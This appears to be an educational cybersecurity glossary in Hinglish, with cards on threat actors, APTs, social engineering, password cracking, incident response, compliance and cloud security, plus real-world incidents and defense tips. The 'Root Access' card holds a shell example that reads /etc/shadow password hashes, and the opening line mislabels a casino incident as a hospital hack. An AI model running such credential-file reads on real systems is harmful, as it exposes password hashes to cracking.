Hospital hack via Fish Tank (2017): Casino ka smart fish tank thermometer hack hua. Attackers ne isse network access liya aur casino's high-roller database exfiltrate ki — 10GB data.

🌉
Network Security
Network infrastructure ko protect karna — overall umbrella term
Network▾
What is it

Policies, tools, aur practices jo network infrastructure protect karte hain — unauthorized access, misuse, modification, denial prevent karna. Firewall, IDS/IPS, VPN, segmentation sab iske components.

Layers

Defense in depth — ek layer breach ho to doosri catch kare. Firewall → IDS → WAF → Endpoint → SIEM — layered approach best practice hai.

🎭
Threat Actor
Koi bhi jo cyberattack kare — multiple types
Network▾
Types

Nation-State: Government-backed (Russia APT28, China APT40)
Cybercriminals: Financial motivation
Hacktivists: Political (Anonymous)
Insider Threat: Employees
Script Kiddies: Amateurs

Why matters

Threat actor type se pata chalta hai motivation kya hai, resources kitne hain, aur defenses kaise adjust karein. Nation-state actors ka zero-day budget ≠ script kiddie ka free tools.

⚠️

Advanced Threats & Social Engineering

Sophisticated attacks jo months tak undetected reh sakte hain — human psychology exploit karna

🕵️
APT
Advanced Persistent Threat — stealth, long-term attack
Advanced▾
What is it

Long-term targeted attack — attacker mahino ya saalo tak network mein chupa rehta hai bina detect hue. Nation-states typically. Goal: data exfiltration ya sabotage — not ransomware quick hit.

Characteristics

Advanced: Zero-days, custom malware, multiple vectors
Persistent: Months/years long campaign
Threat: Specific high-value target

📰 Real World

SolarWinds (2020): Russia's SVR ne SolarWinds software update mein malware inject kiya (supply chain). 18,000 organizations ne infected update install kiya. US government agencies breach — 9 months undetected.

🔭
Cyber Espionage
Digital jasoos — state/corporate secrets chori
Advanced▾
What is it

Government ya corporations ke sensitive information chori karna digital means se. Military plans, technology secrets, diplomatic cables, trade secrets — sab target. Traditional spy agencies ka cyber equivalent.

Players

China (APT40, APT10), Russia (APT28 Fancy Bear, APT29 Cozy Bear), North Korea (Lazarus Group), Iran. India bhi increasingly targeted.

⚔️
Cyber Warfare
Nations ke beech digital war — critical infrastructure target
Advanced▾
What is it

State-sponsored cyberattacks dusre nations ko disrupt ya damage karne ke liye. Power grids, water systems, financial systems, military systems target hote hain. 5th domain of warfare — land, sea, air, space, cyber.

Examples

Ukraine power grid attacks by Russia (2015, 2016). Estonia DDoS (2007). Stuxnet vs Iran. NotPetya Ukraine attack ($10B+ global damage). These are acts of war.

📦
Supply Chain Attack
Third-party vendor ke through attack — trusted software compromise
Advanced▾
What is it

Direct target attack mushkil hai. To attacker uske software supplier, hardware vendor, ya IT provider ko compromise karta hai. Target khud infected software install kar leta hai thinking it's legitimate.

Why devastating

Trusted source se aata hai — security bypasses. Scale: ek vendor compromise = hazaron customers compromise simultaneously. Defense very difficult.

📰 Real World

SolarWinds Orion (2020) + XZ Utils (2024): Open source library mein backdoor inject kiya gaya 2 years ke patient social engineering ke baad. Nearly compromised OpenSSH on millions of Linux servers.

🎭
Social Engineering
Human psychology hack karna — technical bypass nahi, human bypass
Advanced▾
What is it

Humans ko manipulate karke confidential info reveal karwana ya actions perform karwana. Technical skills ki zaroorat nahi — psychological manipulation. Phishing, pretexting, baiting, quid pro quo sab forms.

Techniques

Pretexting: Fake identity banao (IT support, bank)
Baiting: Infected USB chhodna parking mein
Quid Pro Quo: "IT help ke badle password do"
Tailgating: Physically follow someone through secure door

🧠 Analogy

"Tumhara PC virus infected hai, main IT se hun, abhi remote access do" — yahi social engineering. Firewall bypass nahi kiya, tumhe manipulate kiya khud access dene ke liye.

💪
Brute Force Attack
Try every combination — until it works
Advanced▾
What is it

Systematically har possible password/key combination try karna jab tak sahi na mile. Simple 4-digit PIN = 10,000 combinations. "abc123" jaise common passwords seconds mein crack.

Types

Simple Brute Force: aaa, aab, aac...
Dictionary Attack: Common words list
Rainbow Table: Pre-computed hash lookups
Hybrid: Dictionary + variations

🛡️ Defense
  • Rate limiting — 3 attempts failed → lockout
  • CAPTCHA
  • Long, complex passwords — "Tr0ub4dor&3" better than "password123"
  • MFA — even if password cracked, need 2nd factor
🗃️
Credential Stuffing
Leaked passwords ko doosre sites pe try karna
Advanced▾
What is it

Data breach se leaked username-password pairs ko automated tools se hazaron other sites pe try karna. Same password everywhere use karte ho? Ek site breach = sab sites compromise.

Scale

Billions of credentials dark web pe available. Tools like Snipr, STORM automate yeh process. 0.1% success rate bhi millions of accounts = huge impact.

🛡️ Defense
  • Unique password har site pe — password manager use karo (Bitwarden, 1Password)
  • haveibeenpwned.com pe check karo tumhara email leaked hai kya
  • MFA always
🏢
Insider Threat
Ghar ka bhed lanka dhaye — employee ya contractor
Advanced▾
Types

Malicious: Deliberately data steal ya damage kare (disgruntled employee)
Negligent: Accidentally security mistake kare (click phishing, lose laptop)
Compromised: External attacker ne account highjack kiya

Detection

UEBA (behavior analytics) — normal se deviation. Unusual access times, large data downloads, off-hours logins. DLP tools unusual data movement flag karte hain.

📰 Real World

Edward Snowden (2013): NSA contractor — 1.7 million classified documents copied aur media ko diye. Sab access legitimate tha — audit trail nahi tha ki woh itna sab ek saath download kar raha hai.

👦
Script Kiddie
Beginner attacker jo tools use karta hai bina samjhe
Advanced▾
What is it

Unskilled individuals jo publicly available tools/scripts use karte hain attacks ke liye bina understanding ke. "Point and click" hacking. Real hackers inhe seriously nahi lete, par inka sheer volume ek threat hai.

Still dangerous

Volume mein dangerous — hazaron script kiddies = significant DDoS. Basic vulnerabilities exploit kar lete hain. Patched systems ka importance inhi se pata chalta hai.

⚙️
Cyber-Physical Systems
Digital attacks with physical consequences
Advanced▾
What is it

Systems jahan digital aur physical world meet karte hain — industrial control systems (ICS), SCADA, power plants, water treatment, hospital equipment. Hack karo → physical world mein damage.

Danger

Power grid hack → lights off city mein. Water treatment hack → poison in water. Hospital device hack → patient harm. These are life-and-death scenarios — not just data theft.

Governance & Compliance

Rules, regulations, aur processes — security ko systematic banana

⚖️
Risk Management
Threats ko identify, assess aur treat karna systematically
Governance▾
What is it

Risk = Threat × Vulnerability × Impact. Identify karo kya risks hain, kitni probability hai, agar hua to kitna damage — phir decide karo accept karo, mitigate karo, transfer karo (insurance) ya avoid karo.

Framework

Risk Assessment → Treatment → Monitoring → Repeat. Business decision — har risk ko eliminate karna practically/financially impossible. Acceptable risk level define karo.

📝
Compliance
Laws aur standards follow karna — legal obligation
Governance▾
Key Standards

GDPR: EU data privacy (fines up to 4% revenue)
PCI-DSS: Credit card data
HIPAA: US healthcare data
ISO 27001: Information security management
SOC 2: Cloud services

Compliance ≠ Security

Critical distinction! Compliant system can still be insecure. Compliance is minimum bar. Real security goes beyond checkboxes. Many breached companies were "compliant."

🏥
Cyber Insurance
Cyberattack ke financial losses cover karna
Governance▾
What covers

Ransomware payment, data breach notification costs, legal fees, business interruption, regulatory fines, PR/crisis management. Premium increasingly expensive — ransomware surge se.

Requirements

Insurers ab MFA, EDR, backups mandatory require karte hain policy ke liye. Poor security = no insurance ya very high premium.

🪟
Vulnerability
System mein weakness — exploit ho sakta hai
Governance▾
Terminology

Vulnerability: Weakness (unpatched software, misconfiguration)
Threat: Potential for harm (attacker wanting to exploit)
Exploit: Actual code/method to use the vulnerability
CVE: Common Vulnerabilities & Exposures — public database

CVSS Score

0-10 severity rating. 9.0+ = Critical. CVE-2021-44228 (Log4Shell) = 10/10 — literally maximum severity. Patching priority = CVSS score.

🔍
Penetration Testing
Ethical hacking — authorized attack to find weaknesses
Governance▾
What is it

Company authorize karta hai security professionals ko attack karne ke liye — vulnerabilities find karo before real attackers do. Ethical hackers = white hat hackers.

Types

Black Box: No prior info (realistic)
White Box: Full access/info given
Grey Box: Partial info
Red Team: Extended adversary simulation

🧠 Analogy

Bank apne security expert ko bolti hai "try to rob us" — legally. Expert koshish karta hai, gaps dhundhta hai, report karta hai. Fix hote hain before real robber try kare.

💪
Cyber Resilience
Attack ke baad bhi survive aur recover karna
Governance▾
Prevention vs Resilience

Prevention = attack hone mat do. Resilience = attack hone ke baad bhi business continue karo, jaldi recover karo. Modern philosophy: "assume breach" — it WILL happen, be ready.

Components

Incident Response plan, backups, disaster recovery, business continuity plan, crisis communication, lessons learned. RTO (Recovery Time Objective) aur RPO define karo.

🧠
CTI — Cyber Threat Intelligence
Threats ke baare mein actionable information
Governance▾
What is it

Threat actors, their tactics, techniques, procedures (TTPs), indicators of compromise (IoCs) ke baare mein collected aur analyzed information. Proactive defense ke liye use hota hai.

Types

Strategic (board level — risk decisions), Operational (security team — active campaigns), Tactical (analysts — specific TTPs), Technical (SOC — IPs, hashes, domains).

🚔
Cyber Crime
Computer ya internet ke through illegal activities
Governance▾
Types

Financial fraud, identity theft, ransomware, hacking, child exploitation, intellectual property theft, dark web drug markets, cyber stalking. $8 trillion+ global annual cost (2023).

India context

IT Act 2000 (amended 2008) covers cyber crimes in India. Cyber cells in major cities. Incidents report karo: cybercrime.gov.in. Section 66 = unauthorized access, Section 67 = obscene content.

😢
Cyber Bullying
Online harassment aur intimidation
Governance▾
What is it

Digital platforms pe harassment, threatening, humiliation. Social media, gaming, messaging apps. Doxxing (private info public karna), revenge porn, trolling, fake profiles.

Impact

Serious mental health consequences. India mein IT Act aur state laws cover this. Screenshots rakho evidence ke liye, platform report karo, cyber cell complaint karo.

🔬
Digital Forensics
Crime scene investigation — digital evidence collect karna
Governance▾
What is it

Incident ke baad digital evidence collect, preserve, analyze, aur present karna — court mein use hone ke liye. Disk images, memory dumps, network logs, deleted file recovery.

Key principle

Evidence integrity — original tamper nahi hona chahiye. Write blockers use karo, hashes verify karo, chain of custody maintain karo. Tampered evidence court mein inadmissible.

Operations & Response

Day-to-day security operations — jab attack hota hai, kya karte hain

🚨
Incident Response
Security incident handle karna — structured process
Ops▾
IR Phases (NIST)

1. Preparation: Plan banaao pehle
2. Detection & Analysis: Incident identify karo
3. Containment: Spread rokko
4. Eradication: Root cause remove karo
5. Recovery: Normal operations restore
6. Lessons Learned: Post-mortem

Who does it

IR Team = CSIRT (Computer Security Incident Response Team). SOC analysts detect karte hain, IR team respond karta hai, executives communicate karte hain. Playbooks pre-defined hote hain.

🖥️
SOC
Security Operations Center — 24/7 security monitoring command center
Ops▾
What is it

Dedicated team aur facility jo 24/7/365 organization ki security monitor karti hai. SIEM se alerts aate hain, analysts investigate karte hain, incidents respond karte hain. Tier 1-2-3 analysts.

Careers

SOC Analyst — cybersecurity mein most common entry point. Tier 1: alert triage. Tier 2: investigation. Tier 3: threat hunting, advanced analysis. Well paid career path.

🧼
Cyber Hygiene
Basic security habits — daily practice
Ops▾
What is it

Regular security practices jo risk significantly reduce karte hain — just like physical hygiene. 80% of attacks patching aur basic hygiene se prevent ho sakte the.

Essentials

✅ Strong unique passwords + manager
✅ MFA everywhere
✅ Software updates promptly
✅ Regular backups
✅ Phishing awareness
✅ Least privilege
✅ Encrypt sensitive data

⛓️
Chain of Custody
Evidence ki integrity track karna — court ke liye
Ops▾
What is it

Documentation jo track karta hai evidence kahan hai, kisne handle kiya, kab, aur kaise. Criminal cases mein agar chain break ho to evidence inadmissible ho sakta hai court mein.

Digital forensics mein

Disk image lena → hash verify → sealed storage → transport log → analysis. Har step documented. Original kabhi touch nahi — sirf forensic copy pe kaam karo.

📱
UEM
Unified Endpoint Management — all devices ek jagah manage
Ops▾
What is it

Organization ke saare devices (laptops, phones, tablets) ek platform se manage karna — policies enforce karo, software deploy karo, remote wipe karo agar device lost ho.

Why important

BYOD (Bring Your Own Device) era mein employees apne phones pe corporate email use karte hain. UEM security policies enforce karta hai without fully controlling personal devices.

💾
Backup
Data ki copy — last line of defense against ransomware
Ops▾
3-2-1 Rule

3 copies of data
2 different storage media types
1 offsite/offline copy

Offline backup = ransomware encrypt nahi kar sakta. Cloud backup alag account mein — not same credentials.

Test karo!

Backup hai par restore nahi kiya kabhi? Useless. Regular restore tests mandatory. Many organizations discover backup broken hai tab jab actual disaster ho.

🗝️
Encryption Key Management
Keys protect karna — bina key ke encryption useless
Ops▾
What is it

Encryption keys ka lifecycle manage karna — generation, distribution, storage, rotation, destruction. Keys data ke saath same jagah store nahi karni (sabse common mistake).

HSM

Hardware Security Module — dedicated hardware jo keys physically protect karta hai. Banks, governments use karte hain. Keys kabhi HSM se bahar nahi jaate.

☁️
Cloud Security
Cloud environments secure karna — shared responsibility
Ops▾
Shared Responsibility

AWS/Azure/GCP → cloud infrastructure secure karte hain. Customer → data, access, application, configuration secure karna customer ki responsibility. Misconfigured S3 bucket = customer ka fault.

Common misconfigs

Public S3 buckets, weak IAM roles, no encryption at rest, default security groups allowing all traffic, exposed credentials in code repositories (GitHub).

📰 Real World

Capital One (2019): Misconfigured AWS WAF se 100 million credit applications exposed. $190M settlement. Ex-Amazon employee ne exploit kiya. Misconfiguration, not AWS's fault.

📧
Email Security
Email sabse common attack vector — protect karna zaroori
Ops▾
Technologies

SPF: Authorized mail servers list
DKIM: Email digital signature
DMARC: Policy for SPF/DKIM failures
Secure Email Gateway: Spam/malware filter
Sandboxing: Attachments isolate karo

Why critical

91% of cyberattacks start from phishing email. Email sabse exploited vector hai. SPF+DKIM+DMARC configure karo apne domain pe — email spoofing prevent karta hai.

🏢
Physical Security
Cyber security sirf digital nahi — physical access bhi
Ops▾
Why matters

Best firewall bhi useless hai agar attacker physically server room mein ghus jaaye. Lock pick, RFID clone, tailgating — physical attacks real hain. Server rooms biometric access chahiye.

Controls

Keycards, biometrics, CCTV, guards, mantrap (double door airlock), cable locks on laptops, screen locks, clean desk policy, no USB drives policy, visitor logs.

Emerging & Essential Concepts

Future of cybersecurity — AI, dark web, aur jo aage aane wala hai

🤖
AI Security
AI as attacker aur defender — new arms race
Emerging▾
AI as Attacker

Deepfake phishing (voice/video clone), AI-generated perfect spear phishing emails, automated vulnerability discovery, adversarial attacks on ML models, AI-generated malware.

AI as Defender

Anomaly detection, automated threat response, behavior analytics (UEBA), log analysis at scale, vulnerability prediction, smart SIEM. Both sides use AI — arms race.

📰 Real World

WormGPT (2023): ChatGPT jaise AI model, sans restrictions — phishing emails, malware code generate karta tha. Dark web pe subscribe kiya ja sakta tha. Ethics training ke bina AI = powerful criminal tool.

👑
Root Access
Highest privilege — full system control
Emerging▾
What is it

Linux/Unix mein "root" = superuser = god mode. Windows mein "Administrator". Full unrestricted access — files delete, users create, services install, anything. Attackers always try to escalate to root.

Privilege Escalation

Low-level user access se root access tak jaana. Vertical privilege escalation (user → admin) or horizontal (user A → user B's data). Critical vulnerability class.

// Normal user can't read /etc/shadow: $ cat /etc/shadow Permission denied // Root can read everything: $ sudo cat /etc/shadow root:$6$xyz... # password hashes of all users
💥
Password Cracking
Stored password hashes ko crack karna
Emerging▾
How passwords stored

Proper systems passwords plain text nahi store karte — hash store karte hain. SHA256("password123") = fixed string. Attacker hash file chura ke offline crack karta hai.

Tools

Hashcat, John the Ripper — GPU-accelerated password cracking. RTX 4090 = 300 billion MD5 hashes/second. "password" = cracked instantly. "Tr0ub4dor&3" = years.

🛡️ Defense (for developers)
  • bcrypt, Argon2, scrypt — slow hashing algorithms specifically designed for passwords
  • Salt (random string add karo before hashing) — rainbow tables defeat karo
  • Never use MD5 or SHA1 for passwords
🚫
DoS — Denial of Service
Single source se service unavailable karna
Emerging▾
DoS vs DDoS

DoS: Single machine se attack. Easy to block (IP ban karo). Limited bandwidth/impact.
DDoS: Distributed — thousands of sources. Can't block all IPs. Chapter 1 mein covered.

Types of DoS

Volumetric (flood karo), Protocol (TCP SYN flood — half-open connections exhaust karo), Application layer (HTTP requests — web server crash). Each needs different defense.

📊
UEBA
User & Entity Behavior Analytics — anomalies detect karna
Emerging▾
What is it

Machine learning se user aur entity ka normal behavior baseline karo, phir deviations flag karo. John usually 9-5 India se login karta hai. Suddenly 3am Russia se login = red flag.

Detects

Insider threats, compromised accounts, data exfiltration, privilege abuse. Signature se nahi — behavior se detect karta hai. Zero-day threats bhi pakad sakta hai unusual behavior se.

🌑
Dark Web
Hidden internet — Tor network pe, not indexed by Google
Emerging▾
Internet Layers

Surface Web: Google index karta hai (4%)
Deep Web: Password-protected, not indexed — email, banking (90%)
Dark Web: Tor needed, anonymous, not indexed (6%)

Not all evil

Dark web = journalist whistleblowers (Tor Project made by US Navy), censorship bypass (Iran, China activists), privacy enthusiasts. But also: drugs, stolen credentials, hitmen (mostly scams), hacking services, child abuse material (ICAC investigates).

🧠 Analogy

Ocean ki tarah. Surface = visible waala hissa. Deep = underwater (banks, gov databases — not evil, just inaccessible without access). Dark = Mariana Trench — reach karna mushkil, kuch genuinely dangerous creatures wahan.

⚡
Cyber-Physical Attack
Digital attack → real world physical harm
Emerging▾
What is it

Cyber attack jiske physical consequences hain. Power grids off karna, traffic lights hack, pacemaker attack, autonomous vehicle hijack, water poison — digital command = physical disaster.

Increasing threat

Smart cities, connected infrastructure, Industry 4.0 — jitna zyada connectivity, utna zyada attack surface. OT (Operational Technology) security critical ho gayi hai.

📰 Real World

Florida Water Treatment (2021): Hacker ne Oldsmar city ke water treatment plant ka SCADA system access kiya aur sodium hydroxide 111x badha diya — drinking water poison attempt. Operator ne catch kiya, disaster averted.

☁️
Cloud IAM
Cloud resources ka access management — AWS, Azure, GCP
Emerging▾
What is it

Cloud provider ke resources (S3, EC2, databases) tak access control. Roles, policies, permissions — kaunsa service kaunsa resource access kar sakta hai. Misconfigured Cloud IAM = most common cloud breach cause.

Best practices

Least privilege — root account daily use mat karo. MFA on root. Roles use karo instead of long-lived access keys. Regular access review. CloudTrail logging enable karo.

💧
Data Breach
Unauthorized access to sensitive data — confidential info leak
Emerging▾
What is it

Sensitive, confidential ya protected information unauthorized parties ke hands mein jaana. Intentional (hack) ya accidental (misconfigured database). Average cost: $4.45 million (IBM 2023).

Aftermath

GDPR notification 72 hours mein required. Stock price drop (avg 7.5%). Customer trust loss. Class action lawsuits. Regulatory fines. Executives fired. haveibeenpwned.com track karta hai breaches.

📰 Real World

Aadhaar (2018): Report aaya ki 1.1 billion Indians ka Aadhaar data accessible tha for ₹500 via WhatsApp. UIDAI ne deny kiya, par investigation ne serious vulnerabilities found. Government data breach consequences are population-scale.

Cybersecurity Framework
Structured approach to manage cybersecurity risk
Emerging▾
NIST CSF

Most widely used. 5 functions:
1. Identify: Assets, risks samjho
2. Protect: Safeguards implement karo
3. Detect: Incidents identify karo
4. Respond: Action lo
5. Recover: Restore karo

Other Frameworks

CIS Controls: Top 18 security actions
OWASP Top 10: Web vulnerabilities

Building code for architecture. Alag-alag engineers alag-alag sochein to inconsistency. Framework ek common language aur standard approach deta hai — security "building code."
